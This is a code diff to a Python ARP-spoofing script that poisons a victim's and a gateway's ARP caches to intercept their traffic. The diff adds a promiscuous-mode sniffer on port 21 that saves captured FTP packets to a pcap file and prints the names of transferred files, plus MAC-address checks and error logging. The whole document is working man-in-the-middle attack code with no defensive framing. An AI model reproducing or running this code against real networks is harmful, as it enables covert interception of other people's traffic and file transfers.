@@ -2,8 +2,45 @@ from scapy.all import Ether, ARP, srp, send
 import argparse
 import time
 import os
+import logging
+from datetime import datetime
 import sys
-import pickup
+# import pickup_sniff
+from multiprocessing import Process
+from pylibpcap.pcap import sniff, rpcap
+
+def logging (exception, need_print):
+    f = open('log.txt', 'a')
+    date = datetime.now()
+    date = str(date)
+    if need_print == 1:
+        print("log file writing")
+    f.write('\n%s: ' % date)
+    f.write(' Error -> %s' % exception)
+    f.close()
+
+def sniffing(verbose):
+    try:
+        for plen, t, buf in sniff("eth0", filters="port 21", count=-1, promisc=1, out_file="pcap.pcap"):
+            if verbose:
+                print("[+]: Payload len=", plen)
+                print("[+]: Time", t)
+                print("[+]: Payload", buf)
+            else:
+                dec_buf = buf.decode('ISO-8859-1','strict')
+                if "STOR" in dec_buf or "STOU" in dec_buf or "RETR" in dec_buf:
+                    split_buf = list(dec_buf.split(" "))
+                    print("[+]: Files transfering", split_buf[-1])
+    except Exception as e:
+        logging (e, 1)
+        print(e)
+        os._exit(os.EX_OK)
+
+def read():
+    for len, t, pkt in rpcap("pcap.pcap"):
+        print("Buf length:", len)
+        print("Time:", t)
+        print("Buf:", pkt)
 
 def _enable_linux_iproute():
     """
@@ -92,23 +129,36 @@ def restore(target_ip, host_ip, verbose=True):
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="ARP spoof script")
     parser.add_argument("target", help="Victim IP Address to ARP poison")
+    parser.add_argument("mac_t", help="Victim IP Address to ARP poison")
     parser.add_argument("host", help="Host IP Address, the host you wish to intercept packets for (usually the gateway)")
+    parser.add_argument("mac_h", help="Host IP Address, the host you wish to intercept packets for (usually the gateway)")
     parser.add_argument("-v", "--verbose", action="store_true", help="verbosity, default is True (simple message each second)")
     args = parser.parse_args()
-    target, host, verbose = args.target, args.host, args.verbose
+    target, mac_t, host, mac_h, verbose = args.target, args.mac_t, args.host, args.mac_h, args.verbose
+    if mac_t != get_mac(target) or mac_h != get_mac(host):
+        logging("MAC/IP not valid", 1)
+        print("MAC/IP not valid")
+        os._exit(os.EX_OK)
+    # enable_ip_route()
 
-    enable_ip_route()
     try:
-        pickup.sniffing()
+        has_run = 0
         while True:
             # telling the `target` that we are the `host`
+
             spoof(target, host, verbose)
             # telling the `host` that we are the `target`
             spoof(host, target, verbose)
+            if has_run == 0:
+                p = Process(target=sniffing, args=(verbose,))
+                p.start()
+                p.join()
+                has_run = 1
             # sleep for one second
             time.sleep(1)
     except KeyboardInterrupt:
         print("[!] Detected CTRL+C ! restoring the network, please wait...")
+        p.kill()
         restore(target, host)
         restore(host, target)
 
